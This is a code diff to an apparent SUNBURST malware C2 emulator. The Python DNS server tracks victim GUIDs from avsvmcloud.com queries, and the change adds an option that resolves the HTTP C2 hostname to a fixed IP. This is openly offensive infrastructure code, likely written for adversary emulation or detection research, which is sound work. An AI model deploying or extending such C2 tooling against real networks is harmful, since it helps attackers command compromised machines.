@@ -344,7 +344,11 @@ class SunburstDNSC2CoordinatorHandler(object):
 
             qtype = QTYPE[d.q.qtype]
 
-            if qname.endswith("avsvmcloud.com"):
+            if self.server.httpc2ip and qname.split("://")[-1].split("/")[0] == self.server.httpc2hostname.split("://")[-1].split("/")[0]:
+                response = DNSRecord(DNSHeader(id=d.header.id, bitmap=d.header.bitmap, qr=1), q=d.q)
+                response.add_answer(RR(qname.split("://")[-1].split("/")[0], getattr(QTYPE, "A"), rdata=RDMAP["A"](self.server.httpc2ip)))
+                response = response.pack()
+            elif qname.endswith("avsvmcloud.com"):
                 assert(qtype == "A")
                 sunbeam_userid = CryptoHelper.getVictimGUID(qname)
                 if sunbeam_userid in self.server.sunbeams:
@@ -504,13 +508,12 @@ class TCPDNSHandler(SunburstDNSC2CoordinatorHandler, socketserver.BaseRequestHan
             self.request.sendall(length + response)
 
 
-#class UDPDNSServer(socketserver.ThreadingMixIn, socketserver.UDPServer):
-class UDPDNSServer(socketserver.UDPServer):
-
-    def __init__(self, server_address, nameserver, ipv6, httpc2hostname):
+class UDPDNSServer(socketserver.ThreadingMixIn, socketserver.UDPServer):
+    def __init__(self, server_address, nameserver, ipv6, httpc2hostname, httpc2ip=None):
         self.sunbeams = dict()
         self.auto_activate = False
         self.httpc2hostname = httpc2hostname
+        self.httpc2ip = httpc2ip
         self.nameserver = nameserver
         self.ipv6        = ipv6
         self.address_family = socket.AF_INET6 if self.ipv6 else socket.AF_INET
@@ -522,10 +525,11 @@ class TCPDNSServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
 
     allow_reuse_address = True
 
-    def __init__(self, server_address, nameserver, ipv6, httpc2hostname):
+    def __init__(self, server_address, nameserver, ipv6, httpc2hostname, httpc2ip=None):
         self.sunbeams = dict()
         self.auto_activate = False
         self.httpc2hostname = httpc2hostname
+        self.httpc2ip = httpc2ip
         self.nameserver = nameserver
         self.ipv6        = ipv6
         self.address_family = socket.AF_INET6 if self.ipv6 else socket.AF_INET
@@ -678,6 +682,9 @@ if __name__ == '__main__':
     parser.add_argument("--httpc2hostname", metavar="hostname of the HTTP C2 server. The scheme may be prepended ('http://' or 'https://')",
                           default='http://mysunbursthttpc2server.com',
                           help='The hostname of the HTTP C2 server. The scheme may be prepended ("http://" or "https://")')
+    parser.add_argument("--httpc2ip",
+                        metavar="IP address of the HTTP C2 server.",
+                        help='IP address of the HTTP C2 server. e.g. 127.0.0.1')
     parser.add_argument("--nameserver", metavar="8.8.8.8#53 or 4.2.2.1#53#tcp or 2001:4860:4860::8888",
                           default='8.8.8.8',
                           help='The alternative DNS servers to use with proxied requests in IP#PORT format.')
@@ -688,6 +695,8 @@ if __name__ == '__main__':
 
     options = parser.parse_args()
 
+    httpc2ip = options.httpc2ip
+
     if options.ipv6 and options.nameserver == "8.8.8.8":
         options.nameserver = "2001:4860:4860::8888"
 
@@ -695,9 +704,9 @@ if __name__ == '__main__':
         ip = "0.0.0.0" if not options.ipv6 else "::"
         if options.tcp:
             log.info(sys.argv[0] + " is running in TCP mode")
-            server = TCPDNSServer((ip, int(options.port)), options.nameserver, options.ipv6, options.httpc2hostname)
+            server = TCPDNSServer((ip, int(options.port)), options.nameserver, options.ipv6, options.httpc2hostname, httpc2ip=httpc2ip)
         else:
-            server = UDPDNSServer((ip, int(options.port)), options.nameserver, options.ipv6, options.httpc2hostname)
+            server = UDPDNSServer((ip, int(options.port)), options.nameserver, options.ipv6, options.httpc2hostname, httpc2ip=httpc2ip)
         server_thread = threading.Thread(target=server.serve_forever)
         server_thread.daemon = True
         server_thread.start()
